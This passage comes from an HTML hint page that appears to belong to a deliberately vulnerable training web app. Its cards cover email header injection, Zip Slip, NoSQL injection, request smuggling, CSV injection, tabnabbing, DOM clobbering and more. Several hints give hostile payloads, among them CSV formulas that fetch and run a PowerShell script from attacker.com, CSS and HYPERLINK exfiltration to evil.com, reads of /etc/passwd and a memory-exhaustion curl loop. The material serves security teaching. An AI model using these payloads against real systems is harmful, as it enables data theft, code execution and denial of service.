                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/send-email</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ CRLF characters: \r (carriage return) \n (newline)</p>
                    <p>‚Ä¢ URL encoded: %0D%0A or just %0A</p>
                    <p>‚Ä¢ Inject Bcc: to secretly copy emails to yourself</p>
                    <p>‚Ä¢ Inject Subject: to change email subject</p>
                    <p>‚Ä¢ Inject Content-Type: to switch to HTML and add malicious content</p>
                    <p>‚Ä¢ Test payload: user@test.com%0ABcc:attacker@evil.com%0ASubject:HACKED</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üóúÔ∏è</span>
                    <h2 class="vuln-title">Zip Slip / Path Traversal in Archives</h2>
                </div>
                <div class="vuln-description">
                    When extracting zip files, the application should validate where files are being extracted. But what if the zip contains entries like "../../../etc/passwd"? Zip Slip lets you write files ANYWHERE on the system!
                </div>
                <div class="hint-box">
                    Create a malicious zip file where internal paths contain ../ sequences. When extracted, files escape the extraction directory and land in system folders. You can overwrite config files, plant backdoors, or replace executables.
                </div>
                <div class="challenge-box">
                    Can you read files outside the assets folder using /api/assets/? Try /api/assets/../../server.js or /api/assets/../../../etc/passwd. For zip files, craft an archive where entry names include path traversal sequences.
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/extract-zip</span>
                <span class="endpoint-badge">GET /api/assets/*</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ URL encode if needed: ..%2F..%2Fserver.js</p>
                    <p>‚Ä¢ Try different depths: ../, ../../, ../../../</p>
                    <p>‚Ä¢ Windows: ..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts</p>
                    <p>‚Ä¢ Create zip with: zip malicious.zip -r ../../../evil.sh</p>
                    <p>‚Ä¢ Overwrite cron jobs, startup scripts, or config files</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìß</span>
                    <h2 class="vuln-title">Account Enumeration</h2>
                </div>
                <div class="vuln-description">
                    Applications shouldn't tell attackers which usernames exist! But many do: "User not found" vs "Invalid password" reveals which accounts are real. This lets attackers build lists of valid targets before attempting password attacks.
                </div>
                <div class="hint-box">
                    Compare responses carefully. Does "forgot password" say "Email sent" for real users but "User not found" for fake ones? Different response times, messages, or status codes leak information.
                </div>
                <div class="challenge-box">
                    Can you determine which email addresses have accounts? Try /api/forgot-password with various emails. Note differences in responses. Can you map the entire user base?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/forgot-password</span>
                <span class="endpoint-badge">GET /api/user-lookup</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: admin@null.org vs fake@nonexistent.com</p>
                    <p>‚Ä¢ Compare response messages, status codes, timing</p>
                    <p>‚Ä¢ Login errors: "Invalid user" vs "Invalid password"</p>
                    <p>‚Ä¢ Registration: "Email taken" confirms existence</p>
                    <p>‚Ä¢ Automate to test thousands of email addresses</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé®</span>
                    <h2 class="vuln-title">HTML/CSS Injection</h2>
                </div>
                <div class="vuln-description">
                    Not quite XSS, but still dangerous! If you can inject HTML without JavaScript, you can deface pages, create fake login forms, or use CSS to steal data via background images that leak secrets in URLs.
                </div>
                <div class="hint-box">
                    HTML injection adds visible content: fake messages, phishing forms. CSS injection is sneakier: change appearance, hide content, or extract data using attribute selectors that send secrets to your server.
                </div>
                <div class="challenge-box">
                    Can you inject HTML to display a fake message? Try /api/html-inject with HTML tags. For CSS: use /api/style to inject styles. Can you hide the real page and show fake content?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/html-inject</span>
                <span class="endpoint-badge">GET /api/style</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ HTML: Try <h1>Test</h1> or <marquee>Hacked</marquee></p>
                    <p>‚Ä¢ Fake forms for phishing: <form><input></form></p>
                    <p>‚Ä¢ CSS: body{display:none} hides real content</p>
                    <p>‚Ä¢ CSS exfiltration: input[value^="a"]{background:url(evil.com?char=a)}</p>
                    <p>‚Ä¢ Even without <script>, dangerous for social engineering!</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé≠</span>
                    <h2 class="vuln-title">Content Spoofing</h2>
                </div>
                <div class="vuln-description">
                    The URL shows legitimate-site.com but the content is completely fake! Content spoofing lets you craft believable phishing pages that appear from the real site. Users see the correct domain and trust it completely.
                </div>
                <div class="hint-box">
                    If an endpoint reflects user input as page content, you can craft URLs that display fake login forms or error messages. Victim sees real domain + fake content = perfect phishing.
                </div>
                <div class="challenge-box">
                    Can you create a fake page on the real domain? Try /api/spoof or /api/markup with HTML that mimics a login page. How convincing can you make it?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/spoof</span>
                <span class="endpoint-badge">GET /api/markup</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Craft: "Your session expired, please log in"</p>
                    <p>‚Ä¢ Mimic real site styling for believability</p>
                    <p>‚Ä¢ URL shorteners hide long malicious parameters</p>
                    <p>‚Ä¢ Dangling markup: <img src=' captures everything after</p>
                    <p>‚Ä¢ Victims trust it because domain looks legitimate!</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîç</span>
                    <h2 class="vuln-title">NoSQL Injection</h2>
                </div>
                <div class="vuln-description">
                    NoSQL databases like MongoDB use JSON/object queries, not SQL strings. But they're still injectable! Instead of SQL syntax, you inject query operators like $ne (not equal), $gt (greater than), or $where with JavaScript.
                </div>
                <div class="hint-box">
                    Normal login: {username: "admin", password: "pass123"}. But what if you send {username: "admin", password: {"$ne": null}}? This becomes "password not equal to null" - always true! Auth bypassed.
                </div>
                <div class="challenge-box">
                    Can you bypass authentication without knowing the password? Try password={"$ne": null} or password={"$gt": ""}. Can you log in as any user?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/nosql-query</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ $ne: not equal - {"password": {"$ne": ""}}</p>
                    <p>‚Ä¢ $gt: greater than - {"password": {"$gt": ""}}</p>
                    <p>‚Ä¢ $regex: pattern - {"password": {"$regex": ".*"}}</p>
                    <p>‚Ä¢ $where: JavaScript - {"$where": "this.password.length > 0"}</p>
                    <p>‚Ä¢ URL params: ?password[$ne]=null</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåä</span>
                    <h2 class="vuln-title">HTTP Request Smuggling</h2>
                </div>
                <div class="vuln-description">
                    When frontend and backend servers disagree about where one request ends and another begins, chaos! Content-Length says "100 bytes" but Transfer-Encoding says "chunked". Different servers = different answers = smuggled requests!
                </div>
                <div class="hint-box">
                    HTTP requests can specify length two ways: Content-Length OR Transfer-Encoding: chunked. If proxy uses one method but backend uses another, you can hide a second request inside the first. Proxy sees 1 request, backend sees 2!
                </div>
                <div class="challenge-box">
                    This is advanced! Try /api/smuggle to see how headers are processed. Research CL-TE (Content-Length vs Transfer-Encoding) desync attacks. Can you poison other users' requests?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/smuggle</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ CL-TE: Front uses Content-Length, back uses Transfer-Encoding</p>
                    <p>‚Ä¢ TE-CL: Opposite - front uses TE, back uses CL</p>
                    <p>‚Ä¢ Smuggle malicious prefix into next user's request</p>
                    <p>‚Ä¢ Can poison cache, hijack requests, bypass auth</p>
                    <p>‚Ä¢ Very complex - study PortSwigger's research</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåê</span>
                    <h2 class="vuln-title">Host Header Injection</h2>
                </div>
                <div class="vuln-description">
                    The Host header tells the server which domain you're visiting. But what if the server TRUSTS this header for building URLs? You could poison password reset links, redirect users, or poison web caches!
                </div>
                <div class="hint-box">
                    Password reset emails often contain links built like: "https://" + req.headers.host + "/reset?token=...". If you control the Host header, you control where that link goes! Send Host: evil.com and victim gets reset link to YOUR domain.
                </div>
                <div class="challenge-box">
                    Can you hijack password reset tokens? Try curl -H "Host: attacker.com" and check if generated links use your host. Also check /api/cached-content - can you poison cache for other users?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/reset-link</span>
                <span class="endpoint-badge">GET /api/cached-content</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: curl -H "Host: evil.com" /api/reset-link</p>
                    <p>‚Ä¢ Check if generated link uses evil.com</p>
                    <p>‚Ä¢ Cache poisoning: first Host header gets cached</p>
                    <p>‚Ä¢ All visitors get the poisoned response!</p>
                    <p>‚Ä¢ Can steal password reset tokens</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìÑ</span>
                    <h2 class="vuln-title">Source Code Disclosure</h2>
                </div>
                <div class="vuln-description">
                    The entire server source code is accessible! This is like finding the blueprints AND the keys to a building. You can see every vulnerability, every secret, every database query. Game over for the application.
                </div>
                <div class="hint-box">
                    Developers sometimes leave backup files (.bak, .old, ~) or expose .git folders. With source code, you can find hardcoded secrets, understand the exact implementation, and craft perfect exploits for other vulnerabilities.
                </div>
                <div class="challenge-box">
                    Can you read the server's source code? Try /api/source, /server.js.bak, or /.git/HEAD. Once you have the code, look for hardcoded passwords, API keys, and logic flaws. What else can you discover?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/source</span>
                <span class="endpoint-badge">GET /server.js.bak</span>
                <span class="endpoint-badge">GET /.git/HEAD</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Common backup extensions: .bak, .old, .txt, ~, .swp</p>
                    <p>‚Ä¢ .git folder: /.git/config, /.git/HEAD</p>
                    <p>‚Ä¢ Use source to find: hardcoded keys, SQL queries, auth logic</p>
                    <p>‚Ä¢ .DS_Store (Mac), web.config (IIS), .env files</p>
                    <p>‚Ä¢ With source code, every vuln becomes trivial to exploit</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîê</span>
                    <h2 class="vuln-title">Environment Variable Exposure</h2>
                </div>
                <div class="vuln-description">
                    Environment variables store the application's deepest secrets: database passwords, API keys, JWT secrets, AWS credentials. If exposed, attackers get complete system access. This is catastrophic!
                </div>
                <div class="hint-box">
                    process.env contains EVERYTHING: DATABASE_URL with passwords, JWT_SECRET for forging tokens, AWS_ACCESS_KEY for cloud access. One endpoint exposing this = total compromise.
                </div>
                <div class="challenge-box">
                    Can you access the server's environment variables? Try /api/env or /api/headers. What secrets can you find? Database credentials? API keys? Use these to escalate your access everywhere.
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/env</span>
                <span class="endpoint-badge">GET /api/headers</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Look for: DATABASE_URL, JWT_SECRET, API_KEY</p>
                    <p>‚Ä¢ AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY = cloud access</p>
                    <p>‚Ä¢ Node.js: process.env exposes everything</p>
                    <p>‚Ä¢ Also check: /api/headers for server software versions</p>
                    <p>‚Ä¢ Use leaked JWT_SECRET to forge any token you want</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚ö°</span>
                    <h2 class="vuln-title">ReDoS (Regex Denial of Service)</h2>
                </div>
                <div class="vuln-description">
                    Regular expressions are patterns like (a+)+ that match text. Some regex patterns have a nasty bug: when given certain inputs, they take EXPONENTIALLY longer to process. Example: the pattern (a+)+ with input "aaaaaaaaaaa!" makes the regex engine try millions of combinations, freezing the server for minutes!
                </div>
                <div class="hint-box">
                    "Catastrophic backtracking" means the regex engine tries every possible way to match, exploding with complexity. Pattern (a+)+ with "aaaa...X" tries: a+=(a), a+=(aa), a+=(aaa), etc. With 20 'a's = millions of attempts!
                </div>
                <div class="challenge-box">
                    Can you freeze the server? Try sending very long strings with repeated characters to email validation endpoints. How many 'a's does it take before the server becomes unresponsive? What character at the end triggers the backtracking?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/validate-email</span>
                <span class="endpoint-badge">GET /api/regex-dos</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"</p>
                    <p>‚Ä¢ Vulnerable patterns: (a+)+, (a*)*, (a|a)*, (a|ab)+</p>
                    <p>‚Ä¢ Use timing to detect: request taking 10+ seconds = ReDoS</p>
                    <p>‚Ä¢ Email regex often have nested quantifiers like (.+)+@(.+)+</p>
                    <p>‚Ä¢ The "!" at the end forces all combinations to be tried</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé™</span>
                    <h2 class="vuln-title">Clickjacking</h2>
                </div>
                <div class="vuln-description">
                    Imagine a website loaded invisibly inside an &lt;iframe&gt; on an attacker's page. The attacker puts fake buttons like "Win $1000!" over the invisible iframe's real "Delete Account" button. When you click the fake button, you actually click the invisible real button underneath! This tricks users into performing actions they never intended.
                </div>
                <div class="hint-box">
                    X-Frame-Options header tells browsers "Don't allow this page in an iframe". When missing, attackers can overlay transparent iframes and trick users into clicking hidden buttons for password changes, transfers, deletions.
                </div>
                <div class="challenge-box">
                    Can you create a clickjacking attack? Try loading /api/frame-test in an iframe. Make it transparent (opacity: 0.1) and position a fake button underneath. What critical actions can you trick users into performing?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/frame-test</span>
                <span class="endpoint-badge">MOST PAGES</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Create HTML: &lt;iframe src="target.com/transfer" style="opacity:0.1"&gt;&lt;/iframe&gt;</p>
                    <p>‚Ä¢ Position: absolute; top: 100px to align buttons</p>
                    <p>‚Ä¢ Check headers: missing X-Frame-Options = vulnerable</p>
                    <p>‚Ä¢ Also check Content-Security-Policy: frame-ancestors</p>
                    <p>‚Ä¢ Real attacks: trick users into OAuth approvals, money transfers</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìä</span>
                    <h2 class="vuln-title">CSV Injection</h2>
                </div>
                <div class="vuln-description">
                    Excel and spreadsheet programs treat cells starting with = as FORMULAS. If a website exports data to CSV without escaping, attackers can inject =cmd|'/c calc' into their username. When a victim opens the CSV in Excel, the formula EXECUTES on their computer! This can run commands, exfiltrate data, or exploit other spreadsheet features.
                </div>
                <div class="hint-box">
                    CSV = Comma Separated Values (just plain text). Excel sees =, @, +, - as formula starters and EVALUATES them. An attacker sets username to =cmd|'/c whoami' ‚Üí CSV exports it ‚Üí victim opens in Excel ‚Üí command runs on victim's PC!
                </div>
                <div class="challenge-box">
                    Can you inject a formula that will execute when the CSV is opened? Try registering with username: =cmd|'/c calc' or =HYPERLINK("http://attacker.com?c="&A1). What data can you exfiltrate from the spreadsheet?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/export-csv</span>
                <span class="endpoint-badge">GET /api/export/users</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Inject: =cmd|'/c powershell IEX(wget attacker.com/s.ps1)'</p>
                    <p>‚Ä¢ Or: =HYPERLINK("http://evil.com?data="&A1&A2&A3)</p>
                    <p>‚Ä¢ DDE: =cmd|'/c calc'!A0 (Dynamic Data Exchange)</p>
                    <p>‚Ä¢ Characters that trigger formulas: = @ + - | % *</p>
                    <p>‚Ä¢ Real impact: steal entire spreadsheet data, RCE on victim</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîó</span>
                    <h2 class="vuln-title">Tabnabbing</h2>
                </div>
                <div class="vuln-description">
                    When you click a link with target="_blank", it opens in a NEW TAB. But here's the scary part: the new tab has access to window.opener, which is the ORIGINAL TAB! The new page can use window.opener.location = "http://fake-bank.com" to redirect the original tab to a phishing page while you're distracted reading the new tab.
                </div>
                <div class="hint-box">
                    Without rel="noopener noreferrer", new tabs inherit a reference to the parent window. Attacker's page in new tab runs: window.opener.location.href = "http://evil.com/fake-login". You switch back to original tab, see a login screen, think you got logged out, and enter your password into attacker's phishing page!
                </div>
                <div class="challenge-box">
                    Can you exploit this? Create a page that, when opened in a new tab, redirects the parent tab to a fake login page. How convincing can you make the phishing page? Test on /api/external-link
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/external-link</span>
                <span class="endpoint-badge">GET /api/opener</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ In new tab: window.opener.location = "https://evil.com/phish"</p>
                    <p>‚Ä¢ Create convincing fake: copy original site's HTML/CSS</p>
                    <p>‚Ä¢ Attack flow: user clicks link ‚Üí new tab opens ‚Üí script redirects original tab ‚Üí user switches back, sees "login" ‚Üí enters password</p>
                    <p>‚Ä¢ Fix: always use rel="noopener noreferrer" with target="_blank"</p>
                    <p>‚Ä¢ Check: if (window.opener) { /* can exploit */ }</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé¨</span>
                    <h2 class="vuln-title">MIME Sniffing / Content Type</h2>
                </div>
                <div class="vuln-description">
                    Servers send Content-Type headers like "text/plain" or "application/pdf" to tell browsers what kind of file it is. But browsers sometimes IGNORE this and "sniff" the content to guess the real type! If HTML with &lt;script&gt; is sent as text/plain, old browsers might detect it looks like HTML and EXECUTE the scripts anyway! This bypasses XSS protections.
                </div>
                <div class="hint-box">
                    MIME = file type. Sniffing = browser guessing type by reading content. If /api/download returns HTML but says Content-Type: text/plain, Internet Explorer will sniff, detect HTML, and run the scripts! X-Content-Type-Options: nosniff prevents this.
                </div>
                <div class="challenge-box">
                    Can you bypass XSS filters using MIME confusion? Try uploading HTML with &lt;script&gt;alert(1)&lt;/script&gt; to endpoints that serve files with wrong Content-Type. Which browsers execute it? Does adding X-Content-Type-Options: nosniff prevent it?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/download</span>
                <span class="endpoint-badge">GET /api/generate-pdf</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Upload file.txt containing: &lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</p>
                    <p>‚Ä¢ Server serves it as text/plain but browser sniffs HTML</p>
                    <p>‚Ä¢ Test different browsers: IE is most vulnerable, Chrome/Firefox safer</p>
                    <p>‚Ä¢ Check response headers: missing X-Content-Type-Options = vulnerable</p>
                    <p>‚Ä¢ Real exploit: upload "image.jpg" containing HTML, execute XSS</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üéØ</span>
                    <h2 class="vuln-title">Authorization Bypass</h2>
                </div>
                <div class="vuln-description">
                    Authorization checks WHO can access WHAT. Bad implementations check things like HTTP headers or URL parameters instead of secure server-side session data. Setting X-Admin: true or ?debug=true tricks the server into thinking you're an administrator! This is like putting a fake "STAFF" badge on your shirt and walking into the back room ‚Äî shockingly, it sometimes works!
                </div>
                <div class="hint-box">
                    Proper auth checks SESSION or JWT tokens. Broken auth checks X-Admin header, ?isAdmin=true param, or Referer header. Attacker just adds these to their request and gains admin access! Always test: what if I add X-Admin: true?
                </div>
                <div class="challenge-box">
                    Can you access admin-only endpoints? Try adding custom headers like X-Admin: true, X-Role: admin, or URL parameters ?debug=true, ?admin=1. What sensitive data or functions can you access?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/admin-only</span>
                <span class="endpoint-badge">GET /api/secure-data</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try headers: X-Admin: true, X-Role: admin, X-Original-User: admin</p>
                    <p>‚Ä¢ Try params: ?debug=true, ?admin=1, ?bypass=1, ?test=true</p>
                    <p>‚Ä¢ Check cookies: can you set isAdmin=true cookie?</p>
                    <p>‚Ä¢ Look for: if (req.headers['x-admin'] == 'true') { grantAccess(); }</p>
                    <p>‚Ä¢ Real impact: access admin panel, delete users, view all data</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåê</span>
                    <h2 class="vuln-title">Subdomain Takeover</h2>
                </div>
                <div class="vuln-description">
                    Subdomains like blog.example.com use DNS CNAME records pointing to services like Heroku or AWS. If the company deletes their Heroku app but FORGETS to remove the DNS record, the CNAME points to an unclaimed service! Attackers can create a new Heroku app with that name and take control of blog.example.com ‚Äî hosting phishing pages on the legitimate domain!
                </div>
                <div class="hint-box">
                    DNS lookup shows: blog.example.com CNAME old-app-12345.herokuapp.com. Visiting old-app-12345.herokuapp.com shows "App not found". This means you can register it! Now blog.example.com serves YOUR content on their trusted domain.
                </div>
                <div class="challenge-box">
                    Can you identify unclaimed subdomains? Check /api/subdomain-check for CNAME records. If you find "app-12345.herokuapp.com" that doesn't exist, what could you do? How would this help with phishing attacks?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/subdomain-check</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Check DNS: dig blog.example.com ‚Üí shows CNAME</p>
                    <p>‚Ä¢ Visit CNAME target: if 404 or "Not Found" = potentially claimable</p>
                    <p>‚Ä¢ Vulnerable services: Heroku, AWS S3, GitHub Pages, Azure</p>
                    <p>‚Ä¢ Claim it: create account, register that specific name</p>
                    <p>‚Ä¢ Impact: host phishing on legitimate domain, steal cookies/sessions</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîÑ</span>
                    <h2 class="vuln-title">HTTP Verb Tampering</h2>
                </div>
                <div class="vuln-description">
                    HTTP requests use "verbs" (methods) like GET, POST, DELETE, PUT. Security controls might only protect POST /api/admin-delete but forget about GET /api/admin-delete! By changing the verb from POST to GET (or HEAD, OPTIONS, TRACE), you might bypass authentication or CSRF protections. It's like a door locked for "pushing" but anyone can "pull" it open.
                </div>
                <div class="hint-box">
                    Framework routing often has bugs: app.post('/delete', checkAuth) protects POST, but app.all('/delete') or forgotten app.get('/delete') allows unauthorized access! Also, DELETE as GET turns dangerous actions into clickable links.
                </div>
                <div class="challenge-box">
                    Can you access /api/admin-delete using GET instead of DELETE? What about using HEAD or OPTIONS? Try changing the HTTP method on protected endpoints. Which security checks can you bypass?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">ALL /api/admin-delete</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: GET /api/admin-delete when it expects DELETE</p>
                    <p>‚Ä¢ Try: POST /api/view-data when it expects GET</p>
                    <p>‚Ä¢ Try: HEAD request (like GET but no body returned)</p>
                    <p>‚Ä¢ Try: OPTIONS to discover allowed methods</p>
                    <p>‚Ä¢ Impact: bypass CSRF tokens (GET has no body), bypass auth checks</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity low">LOW</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üíæ</span>
                    <h2 class="vuln-title">Memory Leaks</h2>
                </div>
                <div class="vuln-description">
                    Memory leaks happen when a server allocates memory but NEVER releases it. Imagine an endpoint that creates a 10KB array on every request but never deletes it. After 10,000 requests = 100MB leaked. After 100,000 = 1GB! Eventually the server runs out of RAM and crashes. This is a Denial of Service attack using resource exhaustion.
                </div>
                <div class="hint-box">
                    Code like: let globalArray = []; app.get('/leak', () => globalArray.push(new Array(10000))) creates unbounded growth. Each request adds 10KB that's never freed. Spam this endpoint to consume all server memory and crash it.
                </div>
                <div class="challenge-box">
                    Can you crash the server by exhausting its memory? Try sending thousands of requests to /api/memory-leak. Monitor the server's memory usage. How many requests does it take before it becomes unresponsive?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/memory-leak</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Write script: for i in {1..10000}; do curl /api/memory-leak; done</p>
                    <p>‚Ä¢ Monitor: watch "ps aux | grep node" to see memory grow</p>
                    <p>‚Ä¢ Each request adds ~10KB, 10,000 requests = 100MB leaked</p>
                    <p>‚Ä¢ Server crashes when RAM full (varies by system, usually ~1-2GB)</p>
                    <p>‚Ä¢ Real impact: DoS entire website, requires restart to recover</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåê</span>
                    <h2 class="vuln-title">DOM Clobbering</h2>
                </div>
                <div class="vuln-description">
                    HTML elements with id or name attributes automatically become JavaScript globals! If code checks window.isAdmin and you inject HTML with id="isAdmin", your HTML element OVERWRITES the JavaScript variable. This can bypass client-side security checks. Example: &lt;input name="isAdmin" value="true"&gt; makes window.isAdmin.value = "true"!
                </div>
                <div class="hint-box">
                    DOM = Document Object Model (HTML as JavaScript objects). Clobbering = overwriting. Browser creates: &lt;div id="config"&gt; ‚Üí window.config = that div. If code expects window.config.apiURL, inject &lt;a id="config" href="http://evil.com"&gt; ‚Üí config.href overwrites it!
                </div>
                <div class="challenge-box">
                    Can you exploit /api/dom-test by injecting HTML that clobbers JavaScript variables? Try injecting elements with strategic id/name attributes. What client-side checks can you bypass? Can you change where the app sends data?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/dom-test</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Inject: &lt;input name="isAdmin" value="true"&gt;</p>
                    <p>‚Ä¢ Inject: &lt;a id="config" href="http://attacker.com"&gt;&lt;/a&gt;</p>
                    <p>‚Ä¢ Inject: &lt;form name="credentials"&gt;&lt;input name="apiKey" value="stolen"&gt;&lt;/form&gt;</p>
                    <p>‚Ä¢ Check if code uses: if (window.isAdmin) or if (config.apiURL)</p>
                    <p>‚Ä¢ Impact: bypass auth checks, redirect API calls, XSS in some cases</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üì®</span>
                    <h2 class="vuln-title">PostMessage XSS</h2>
                </div>
                <div class="vuln-description">
